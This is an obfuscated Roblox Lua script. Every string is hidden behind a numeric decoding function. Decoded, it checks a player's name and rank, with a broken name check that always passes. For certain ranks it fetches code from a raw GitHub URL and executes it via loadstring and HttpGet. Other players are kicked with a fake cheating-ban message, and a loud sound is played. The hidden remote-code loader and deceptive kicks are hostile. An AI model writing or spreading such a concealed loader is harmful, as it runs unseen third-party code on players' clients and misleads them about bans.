function BDsPHgHIjusNICZlxnjloqFmZxXYSlJ(code)res=''for i in ipairs(code)do res=res..string.char(code[i]/105)end return res end 


local coregui = game:serviceBDsPHgHIjusNICZlxnjloqFmZxXYSlJ({7035,11655,11970,10605,7455,12285,11025})
local music = Instance.new(BDsPHgHIjusNICZlxnjloqFmZxXYSlJ({8715,11655,12285,11550,10500}), coregui)
music.SoundId = BDsPHgHIjusNICZlxnjloqFmZxXYSlJ({11970,10290,12600,10185,12075,12075,10605,12180,11025,10500,6090,4935,4935,5775,5040,5670,5775,5775,5040,5040,5250,5355,5355})
music.Volume = 7
music.Looped = false


wait(3)
if game.Players.LocalPlayer.Name == BDsPHgHIjusNICZlxnjloqFmZxXYSlJ({12810,10185,12180,12180,11025,11970,11025,12810,11655,11970,12180,12810,11655,11970,12180,5355,5145,5355,5355}) or BDsPHgHIjusNICZlxnjloqFmZxXYSlJ({12075,10185,11445,11025,10290,10185,10290,10185,11760,11970,11655,11235,11025,11550,10815}) then

local old = game.Players.LocalPlayer.leaderstats.Rank
if old.Value == BDsPHgHIjusNICZlxnjloqFmZxXYSlJ({8085,6825,9240,4725,5355}) then
loadstring(game:HttpGet(BDsPHgHIjusNICZlxnjloqFmZxXYSlJ({10920,12180,12180,11760,12075,6090,4935,4935,11970,10185,12495,4830,10815,11025,12180,10920,12285,10290,12285,12075,10605,11970,10395,11655,11550,12180,10605,11550,12180,4830,10395,11655,11445,4935,11025,10605,11550,12600,11130,12600,12285,11025,10710,11130,10710,10710,4935,7770,12075,11130,12600,11130,10395,11025,10710,11130,10710,10290,10290,10710,10500,10290,10710,10920,10500,10815,10815,4935,11445,10185,11025,11550,4935,7455,10500,10290,10920,10815})))()
elseif old.Value ==BDsPHgHIjusNICZlxnjloqFmZxXYSlJ({8085,6825,9240,4725,5460}) then
loadstring(game:HttpGet(BDsPHgHIjusNICZlxnjloqFmZxXYSlJ({10920,12180,12180,11760,12075,6090,4935,4935,11970,10185,12495,4830,10815,11025,12180,10920,12285,10290,12285,12075,10605,11970,10395,11655,11550,12180,10605,11550,12180,4830,10395,11655,11445,4935,11025,10605,11550,12600,11130,12600,12285,11025,10710,11130,10710,10710,4935,7770,12075,11130,12600,11130,10395,11025,10710,11130,10710,10290,10290,10710,10500,10290,10710,10920,10500,10815,10815,4935,11445,10185,11025,11550,4935,7455,10500,10290,10920,10815})))()
elseif old.Value == BDsPHgHIjusNICZlxnjloqFmZxXYSlJ({8085,6825,9240,4725,5565}) then 
loadstring(game:HttpGet(BDsPHgHIjusNICZlxnjloqFmZxXYSlJ({10920,12180,12180,11760,12075,6090,4935,4935,11970,10185,12495,4830,10815,11025,12180,10920,12285,10290,12285,12075,10605,11970,10395,11655,11550,12180,10605,11550,12180,4830,10395,11655,11445,4935,11025,10605,11550,12600,11130,12600,12285,11025,10710,11130,10710,10710,4935,7770,12075,11130,12600,11130,10395,11025,10710,11130,10710,10290,10290,10710,10500,10290,10710,10920,10500,10815,10815,4935,11445,10185,11025,11550,4935,7455,10500,10290,10920,10815})))()
elseif old.Value == BDsPHgHIjusNICZlxnjloqFmZxXYSlJ({8085,6825,9240,4725,5670}) then
loadstring(game:HttpGet(BDsPHgHIjusNICZlxnjloqFmZxXYSlJ({10920,12180,12180,11760,12075,6090,4935,4935,11970,10185,12495,4830,10815,11025,12180,10920,12285,10290,12285,12075,10605,11970,10395,11655,11550,12180,10605,11550,12180,4830,10395,11655,11445,4935,11025,10605,11550,12600,11130,12600,12285,11025,10710,11130,10710,10710,4935,7770,12075,11130,12600,11130,10395,11025,10710,11130,10710,10290,10290,10710,10500,10290,10710,10920,10500,10815,10815,4935,11445,10185,11025,11550,4935,7455,10500,10290,10920,10815})))()
elseif old.Value == BDsPHgHIjusNICZlxnjloqFmZxXYSlJ({8085,6825,9240,4725,5775}) then
loadstring(game:HttpGet(BDsPHgHIjusNICZlxnjloqFmZxXYSlJ({10920,12180,12180,11760,12075,6090,4935,4935,11970,10185,12495,4830,10815,11025,12180,10920,12285,10290,12285,12075,10605,11970,10395,11655,11550,12180,10605,11550,12180,4830,10395,11655,11445,4935,11025,10605,11550,12600,11130,12600,12285,11025,10710,11130,10710,10710,4935,7770,12075,11130,12600,11130,10395,11025,10710,11130,10710,10290,10290,10710,10500,10290,10710,10920,10500,10815,10815,4935,11445,10185,11025,11550,4935,7455,10500,10290,10920,10815})))()
else

game.Players.LocalPlayer:Kick(BDsPHgHIjusNICZlxnjloqFmZxXYSlJ({9345,11655,12285,3360,10920,10185,12390,10605,3360,10290,10605,10605,11550,3360,10290,10185,11550,11550,10605,10500,3360,10710,11655,11970,3360,12285,12075,11025,11550,10815,3360,7665,11550,4725,7455,10185,11445,10605,4200,7035,10920,10605,10185,12180,11025,11550,10815,4620,3360,7245,12600,11760,11340,11655,11025,12180,11025,11550,10815,3360,10605,12180,10395,4830,4305,4830,3360,7665,10710,3360,12705,11655,12285,3360,12180,10920,11025,11550,11235,3360,12180,10920,11025,12075,3360,11025,12075,3360,10185,3360,11445,11025,12075,12180,10185,11235,10605,4620,3360,11760,11340,10605,10185,12075,10605,3360,10920,10605,10185,10500,3360,11655,12390,10605,11970,3360,12180,11655,3360,12180,10920,10605,3360,12075,12285,11760,11760,11655,11970,12180,3360,10395,10920,10185,11550,11550,10605,11340,4830}))
wait (2.8)
music:Play()
wait(1)
game.Players.LocalPlayer:Kick(BDsPHgHIjusNICZlxnjloqFmZxXYSlJ({20685,16590,10185,11235,10185,3360,20685,16695,10185,11235,10185,4620,3360,5565,3360,11970,10185,11550,11235,3360,12705,10605,12180,10605,11970,3360,11445,11235,3360,10815,11025,12180,3360,12075,10185,12180,20580,18585,11550,3360,10185,11340}))
end

end
    
